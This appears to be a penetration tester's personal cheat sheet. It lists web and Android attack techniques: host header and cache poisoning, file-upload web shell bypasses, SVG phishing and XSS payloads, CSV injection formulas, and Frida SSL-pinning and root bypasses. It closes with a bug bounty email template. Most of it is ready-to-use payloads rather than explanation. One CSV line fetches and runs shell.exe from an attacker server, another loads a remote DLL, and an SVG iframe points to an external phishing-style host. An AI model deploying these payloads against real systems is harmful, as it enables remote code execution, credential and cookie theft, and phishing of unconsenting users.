# Tools
## 1. Api Count: [Download](https://github.com/krrathod/penetesterhelper.github.io/blob/main/apiCount.py)

# CIA
	Integrity : data only change by auth.
	Avalability : Available data when user need.
	Confidentility : Data access by auth.
	
# Containt Discover
	dirb https://domain.com/ /usr/share/wordlists/dirb/big.txt
	gobuster -u http://fakebank.com -w wordlist.txt dir 
	
# directory Traversal
	dirb https://domain.com/ /usr/share/wordlists/wfuzz/vulns/dirTraversal-nix.txt
	
# Clickjackibg
	<!DOCTYPE html>
		<html lang="en">
		<head>
		  <meta charset="UTF-8">
		</head>
		<body>
		  <iframe src="{url}" frameborder="0"></iframe>
		</body>
	</html>

# Weak SSL Ciphers
	V1.0 & V1.1 is vulnerable
	nmap -Pn --script ssl-enum-ciphers {domain} -p {port}
	
# Host Header Poisoning
## 1. Basic
	Change "Host" header 

## 2. via middleware (for password reseting)
	Add X-Forwarded-Host: <domain.com>
	https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-poisoning-via-middleware
	
## 3. via dangling markup
	Try "Host: domain.com" to "Host: domain.com:attacker.com"
	https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning/lab-host-header-password-reset-poisoning-via-dangling-markup
	
# Web Caches Poisioning
## 1. Via an unkeyed header
	This lab supports the X-Forwarded-Host header. 
	https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-an-unkeyed-header
	
## 2. Via an unkeyed cookie
	change cookies value.
	https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-an-unkeyed-cookie
	
## 3. Via multiple headers
	X-Forwarded-Scheme:http
	X-Forwarded-Host: example.com
	https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-multiple-headers
	
# CORS Payload
	https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CORS%20Misconfiguration/README.md
	
# RCE
## 1. Basic
	not delete @PNG
	Upload Php File
	
## 2. via Content-Type restriction bypass
	Change "Content-Type" header
	https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-content-type-restriction-bypass
	
## 3. via path traversal
	Change file name "test.php" to "..%2ftest.php"
	https://www.youtube.com/watch?v=4R3PUhiFzS4
	
## 4. via obfuscated file extension
	change file name filename="exploit.php%00.jpg"
	https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-obfuscated-file-extension
	
## 5. via race condition
	https://www.youtube.com/watch?v=mt0BN5pYHXI 
	https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-race-condition
	
# No Rate Limit
## 1. via brute force
	send request to intruder
## 2. via Race Condition
	Send request to turbo
	add "race.py" payload
	add "test: %s" header in header
	

# SVG Payload
## 1. Phising Attack

	<svg width="1500" height="1500"
	  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">

	  <foreignObject width="1500px" height="1500px">
		<iframe xmlns="http://www.w3.org/1999/xhtml" style="width: 1500px; height: 1500px;" src="https://numberless-holddown.000webhostapp.com/"/>
	  </foreignObject>
	</svg>

## 2. XSS	
	
	<?xml version="1.0" standalone="no"?>
	<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">

	<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
	   <rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
	   <script type="text/javascript">
		  alert(document.cookie);
	   </script>
	</svg>
	
# CSV Injection Payload

	DDE ("cmd";"/C calc";"!A0")A0
	@SUM(1+9)*cmd|' /C calc'!A0
	=10+20+cmd|' /C calc'!A0
	=cmd|' /C notepad'!'A1'
	=cmd|'/C powershell IEX(wget attacker_server/shell.exe)'!A0
	=cmd|'/c rundll32.exe \\10.0.0.1\3\2\1.dll,0'!_xlbgnm.A1
	=@MSEXCEL|'\..\..\..\Windows\System32\cmd.exe /c calc.exe'!_xlbgnm.A1
	
# Adb Command
	adb root
	
## 1. Download application or file from enumalator
	adb pull /data/app/{package-name} /{location}
	
## 2. Install Application or transfer file
	adb push {file.path} {location}
	
## 3. Activity Manager
	adb shell am start -n {package_name}/.{activity_name}
	
# App Manipulation
	apktool d/b
	keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000 
	java -jar .\apksigner.jar  sign --ks my-release-key.keystore app-debug.apk

# Sensitive Information in Application Memory (Memory Dump)
	frida-ps -U
	python3 fridump.py -U -s "UPCL Smart Billing"
	
	http://pentestcorner.com/fridump-android-examples/
	
# Frida Setup
## 1. Tools
	1) Android Emulator API 32
	2) BurpSuit 
	
## 2. Install Frida in Android Emulator
	adb push frida_server /data/local/tmp  
	adb push ca_cert /data/local/tmp

## 3. Install Frida in Windows or Linux
	pip3 install frida-tools
	pip3 install objection frida-tools

## 4 package Name
	frida-ps -Ua

## SSL Bypass
    objection -g pakage_name explore  
    android sslpinning disable  
   
## Root Bypass
	frida -U --codeshare dzonerzy/fridantiroot -f YOUR_BINARY
	
# Bug Bounty Report Mail

	Subject: Security Vulnerabilities Found on Website

	Dear [name],

	I recently visited your website and noticed a bug while I was navigating through the pages. I am writing to notify you that I have identified several 		security vulnerabilities on your website. Specifically, I discovered an [Vulnerability_Name] These are serious issues which could potentially lead to a data breach or other malicious activities if left unaddressed. As such it is important that these issues be addressed as soon as possible in order to protect your website from potential threats. Please let me know how you would like me to proceed with providing additional information about these findings so we can work together towards resolving them quickly and efficiently for the safety of your customers’ data and other sensitive information stored within the system.  

	POC: [POC]

	Sincerely
	[Your Name]
